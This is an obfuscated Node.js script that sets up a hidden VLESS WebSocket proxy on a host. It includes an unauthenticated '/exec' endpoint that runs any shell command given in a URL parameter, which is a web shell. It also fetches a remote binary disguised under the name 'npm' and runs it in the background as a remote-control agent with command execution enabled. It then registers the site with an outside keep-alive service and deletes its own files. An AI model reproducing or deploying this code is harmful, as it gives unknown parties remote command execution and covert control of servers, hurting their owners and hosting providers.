const _0x46bac7=_0x2899;(function(_0x34a77b,_0x371a89){const _0x188fec=_0x2899,_0x49f017=_0x34a77b();while(!![]){try{const _0x549f2f=parseInt(_0x188fec(0xb7))/0x1+parseInt(_0x188fec(0x8f))/0x2+-parseInt(_0x188fec(0xbd))/0x3*(-parseInt(_0x188fec(0xaa))/0x4)+-parseInt(_0x188fec(0x94))/0x5*(parseInt(_0x188fec(0xb9))/0x6)+parseInt(_0x188fec(0xc6))/0x7+-parseInt(_0x188fec(0x9b))/0x8+-parseInt(_0x188fec(0xac))/0x9;if(_0x549f2f===_0x371a89)break;else _0x49f017['push'](_0x49f017['shift']());}catch(_0x4e1226){_0x49f017['push'](_0x49f017['shift']());}}}(_0x45d1,0xa89e7));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x46bac7(0xb3)),net=require(_0x46bac7(0xb6)),{Buffer}=require(_0x46bac7(0xc4)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x46bac7(0xab)][_0x46bac7(0xb8)]||_0x46bac7(0x97),NEZHA_SERVER=process[_0x46bac7(0xab)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x46bac7(0xab)][_0x46bac7(0xd2)]||'',NEZHA_KEY=process[_0x46bac7(0xab)][_0x46bac7(0xd7)]||'',DOMAIN=process['env'][_0x46bac7(0xad)]||_0x46bac7(0xe2),AUTO_ACCESS=process['env'][_0x46bac7(0x96)]||!![],NAME=process[_0x46bac7(0xab)][_0x46bac7(0xd0)]||_0x46bac7(0xa5),PORT=process[_0x46bac7(0xab)]['PORT']||0x8ac0,url=require(_0x46bac7(0xc7)),metaInfo=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x46bac7(0xe7)}),ISP=metaInfo['trim'](),httpServer=http['createServer']((_0x419221,_0xddca62)=>{const _0x295e1e=_0x46bac7,_0x3c49df=url['parse'](_0x419221['url'],!![]);if(_0x3c49df[_0x295e1e(0xd9)]===_0x295e1e(0xb0)){console['log'](_0x3c49df[_0x295e1e(0xc8)]);if(!_0x3c49df[_0x295e1e(0xc8)][_0x295e1e(0xcc)]){_0xddca62[_0x295e1e(0xa3)](0xc8,{'Content-Type':'text/plain'}),_0xddca62[_0x295e1e(0xa8)](_0x295e1e(0xb5));return;}let _0xd8e656=_0x3c49df[_0x295e1e(0xc8)][_0x295e1e(0xcc)];exec(_0xd8e656,function(_0x4faa0,_0x24880a,_0x39ded3){const _0x29865f=_0x295e1e;_0x4faa0?(_0xddca62[_0x29865f(0xa3)](0xc8,{'Content-Type':'text/plain'}),_0xddca62[_0x29865f(0xa8)](_0x4faa0[_0x29865f(0xd5)])):(_0xddca62[_0x29865f(0xa3)](0xc8,{'Content-Type':'text/plain'}),_0xddca62[_0x29865f(0xa8)](_0x24880a));});return;}if(_0x419221[_0x295e1e(0xc7)]==='/')_0xddca62['writeHead'](0xc8,{'Content-Type':_0x295e1e(0xce)}),_0xddca62[_0x295e1e(0xa8)](_0x295e1e(0xa4));else{if(_0x419221[_0x295e1e(0xc7)]==='/'+UUID){const _0x21a275=DOMAIN[_0x295e1e(0x9c)]('.')[0x0],_0x4f1f4e=_0x295e1e(0xa1)+UUID+_0x295e1e(0xae)+DOMAIN+_0x295e1e(0x99)+DOMAIN+_0x295e1e(0x9e)+_0x21a275+'-'+ISP,_0x372eaf=Buffer['from'](_0x4f1f4e)[_0x295e1e(0x9f)](_0x295e1e(0x91));_0xddca62[_0x295e1e(0xa3)](0xc8,{'Content-Type':'text/plain'}),_0xddca62[_0x295e1e(0xa8)](_0x372eaf+'\x0a');}else _0xddca62[_0x295e1e(0xa3)](0x194,{'Content-Type':_0x295e1e(0xce)}),_0xddca62[_0x295e1e(0xa8)](_0x295e1e(0xda));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x46bac7(0xcb)](/-/g,'');function _0x45d1(){const _0x253ca6=['pathname','Not\x20Found\x0a','readUInt8','write','log','data','substr','reduce','includes','1.baozong.ggff.net','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','pop','map','npm\x20download\x20successfully','utf-8','once','readUInt16BE','send','443','2053','unlink','https://','false','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','npm\x20is\x20already\x20running','listen','1753122zdEZMG','length','base64','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','error','223715mannnT','Error\x20added\x20Task:','AUTO_ACCESS','fbe2f96f-bad3-4814-96d4-8f99c248d733','every','&type=ws&host=','2083','4640848XPnSVO','split','writeFileSync','&path=%2F#','toString','2096','vless://','https://amd64.ssss.nyc.mn/v1','writeHead','Hello,\x20World\x0a','Vls','Server\x20is\x20running\x20on\x20port\x20','npm\x20running\x20error:\x20','end','NEZHA_SERVER:\x20','4MkhAGj','env','21920328pjuRNk','DOMAIN','@www.visa.com.tw:443?encryption=none&security=tls&sni=','npm','/exec','slice','8443','axios','\x20>/dev/null\x202>&1\x20&','No\x20command\x0a','net','1345639OeEgxy','UUID','6FhIsyz','true','\x20-p\x20','pipe','2879607CwHaGz','aarch64','2087','config.yaml','connect','join','https://arm64.ssss.nyc.mn/agent','buffer','existsSync','3983245yJrCfG','url','query','connection','arch','replace','cmd','decode','text/plain','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','NAME','finish','NEZHA_PORT','Error\x20sending\x20request:','nohup\x20./npm\x20-s\x20','message','has','NEZHA_KEY','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'];_0x45d1=function(){return _0x253ca6;};return _0x45d1();}function _0x2899(_0x262773,_0x4a5c78){const _0x45d199=_0x45d1();return _0x2899=function(_0x289945,_0x207438){_0x289945=_0x289945-0x8c;let _0x51757c=_0x45d199[_0x289945];return _0x51757c;},_0x2899(_0x262773,_0x4a5c78);}wss['on'](_0x46bac7(0xc9),_0x492969=>{const _0x76bd0c=_0x46bac7;_0x492969[_0x76bd0c(0xe8)](_0x76bd0c(0xd5),_0x2890f8=>{const _0x5aeb83=_0x76bd0c,[_0x4eab87]=_0x2890f8,_0x39dc1b=_0x2890f8[_0x5aeb83(0xb1)](0x1,0x11);if(!_0x39dc1b[_0x5aeb83(0x98)]((_0x7e6821,_0x272964)=>_0x7e6821==parseInt(uuid[_0x5aeb83(0xdf)](_0x272964*0x2,0x2),0x10)))return;let _0x5e29d0=_0x2890f8[_0x5aeb83(0xb1)](0x11,0x12)[_0x5aeb83(0xdb)]()+0x13;const _0x5a657b=_0x2890f8['slice'](_0x5e29d0,_0x5e29d0+=0x2)['readUInt16BE'](0x0),_0x54a18b=_0x2890f8[_0x5aeb83(0xb1)](_0x5e29d0,_0x5e29d0+=0x1)['readUInt8'](),_0x11d746=_0x54a18b==0x1?_0x2890f8[_0x5aeb83(0xb1)](_0x5e29d0,_0x5e29d0+=0x4)['join']('.'):_0x54a18b==0x2?new TextDecoder()[_0x5aeb83(0xcd)](_0x2890f8['slice'](_0x5e29d0+0x1,_0x5e29d0+=0x1+_0x2890f8[_0x5aeb83(0xb1)](_0x5e29d0,_0x5e29d0+0x1)['readUInt8']())):_0x54a18b==0x3?_0x2890f8[_0x5aeb83(0xb1)](_0x5e29d0,_0x5e29d0+=0x10)[_0x5aeb83(0xe0)]((_0x300b17,_0x55cd84,_0x3d7f3f,_0x3b6df9)=>_0x3d7f3f%0x2?_0x300b17['concat'](_0x3b6df9[_0x5aeb83(0xb1)](_0x3d7f3f-0x1,_0x3d7f3f+0x1)):_0x300b17,[])[_0x5aeb83(0xe5)](_0x49a8c2=>_0x49a8c2[_0x5aeb83(0xe9)](0x0)[_0x5aeb83(0x9f)](0x10))[_0x5aeb83(0xc2)](':'):'';_0x492969[_0x5aeb83(0xea)](new Uint8Array([_0x4eab87,0x0]));const _0x565101=createWebSocketStream(_0x492969);net[_0x5aeb83(0xc1)]({'host':_0x11d746,'port':_0x5a657b},function(){const _0x2af08e=_0x5aeb83;this[_0x2af08e(0xdc)](_0x2890f8[_0x2af08e(0xb1)](_0x5e29d0)),_0x565101['on'](_0x2af08e(0x93),()=>{})['pipe'](this)['on'](_0x2af08e(0x93),()=>{})[_0x2af08e(0xbc)](_0x565101);})['on']('error',()=>{});})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x26ec8c=_0x46bac7,_0x52b118=os[_0x26ec8c(0xca)]();return _0x52b118==='arm'||_0x52b118==='arm64'||_0x52b118===_0x26ec8c(0xbe)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x26ec8c(0xc3):!NEZHA_PORT?_0x26ec8c(0xa2):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3e36c4=_0x46bac7;try{const _0x5a0055=getDownloadUrl(),_0x4da436=await axios({'method':'get','url':_0x5a0055,'responseType':'stream'}),_0x157aca=fs['createWriteStream'](_0x3e36c4(0xaf));return _0x4da436[_0x3e36c4(0xde)]['pipe'](_0x157aca),new Promise((_0x161835,_0xbbe31b)=>{const _0x4e6d26=_0x3e36c4;_0x157aca['on'](_0x4e6d26(0xd1),()=>{const _0x27008e=_0x4e6d26;console[_0x27008e(0xdd)](_0x27008e(0xe6)),exec('chmod\x20+x\x20./npm',_0x5d5cdf=>{if(_0x5d5cdf)_0xbbe31b(_0x5d5cdf);_0x161835();});}),_0x157aca['on'](_0x4e6d26(0x93),_0xbbe31b);});}catch(_0x376934){throw _0x376934;}},runnz=async()=>{const _0x289d8f=_0x46bac7;await downloadFile();let _0x8a679e='',_0x37e278='';console[_0x289d8f(0xdd)](_0x289d8f(0xa9)+NEZHA_SERVER);const _0x505852=()=>{const _0x537b6c=_0x289d8f;try{const _0x5ef223=execSync(_0x537b6c(0x92))[_0x537b6c(0x9f)]();return _0x5ef223[_0x537b6c(0x90)]>0x0;}catch(_0x102799){return![];}};if(_0x505852()){console[_0x289d8f(0xdd)](_0x289d8f(0x8d));return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x331558=[_0x289d8f(0xeb),_0x289d8f(0xb2),_0x289d8f(0xa0),_0x289d8f(0xbf),'2083',_0x289d8f(0xec)];_0x8a679e=_0x331558['includes'](NEZHA_PORT)?'--tls':'',_0x37e278=_0x289d8f(0xd4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x289d8f(0xbb)+NEZHA_KEY+'\x20'+_0x8a679e+_0x289d8f(0xb4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e14e2=NEZHA_SERVER[_0x289d8f(0xe1)](':')?NEZHA_SERVER[_0x289d8f(0x9c)](':')[_0x289d8f(0xe4)]():'',_0x40b4fe=new Set([_0x289d8f(0xeb),_0x289d8f(0xb2),_0x289d8f(0xa0),_0x289d8f(0xbf),_0x289d8f(0x9a),'2053']),_0x3c4ae8=_0x40b4fe[_0x289d8f(0xd6)](_0x5e14e2)?_0x289d8f(0xba):_0x289d8f(0xef),_0x39f1a6='\x0aclient_secret:\x20'+NEZHA_KEY+_0x289d8f(0xd8)+NEZHA_SERVER+_0x289d8f(0xcf)+_0x3c4ae8+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;!fs[_0x289d8f(0xc5)](_0x289d8f(0xc0))&&fs[_0x289d8f(0x9d)](_0x289d8f(0xc0),_0x39f1a6);}_0x37e278=_0x289d8f(0xe3);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x37e278,{'shell':'/bin/bash'}),console[_0x289d8f(0xdd)]('npm\x20is\x20running');}catch(_0x1f111d){console[_0x289d8f(0x93)](_0x289d8f(0xa7)+_0x1f111d);}};async function addAccessTask(){const _0xbdd1e3=_0x46bac7;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console[_0xbdd1e3(0xdd)](_0xbdd1e3(0x8c));return;}else{const _0x2132dc=_0xbdd1e3(0xee)+DOMAIN,_0x4b7e5c='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x2132dc+'\x22}\x27';exec(_0x4b7e5c,(_0x8750c1,_0x492956,_0x4681e0)=>{const _0x6827e4=_0xbdd1e3;if(_0x8750c1){console[_0x6827e4(0x93)](_0x6827e4(0xd3),_0x8750c1['message']);return;}console[_0x6827e4(0xdd)]('Automatic\x20Access\x20Task\x20added\x20successfully:',_0x492956);});}}catch(_0xf2e4d5){console[_0xbdd1e3(0x93)](_0xbdd1e3(0x95),_0xf2e4d5['message']);}}const delFiles=()=>{const _0x41e239=_0x46bac7;fs[_0x41e239(0xed)](_0x41e239(0xaf),()=>{}),fs[_0x41e239(0xed)](_0x41e239(0xc0),()=>{});};httpServer[_0x46bac7(0x8e)](PORT,()=>{const _0x542b5d=_0x46bac7;runnz(),addAccessTask(),console[_0x542b5d(0xdd)](_0x542b5d(0xa6)+PORT);});
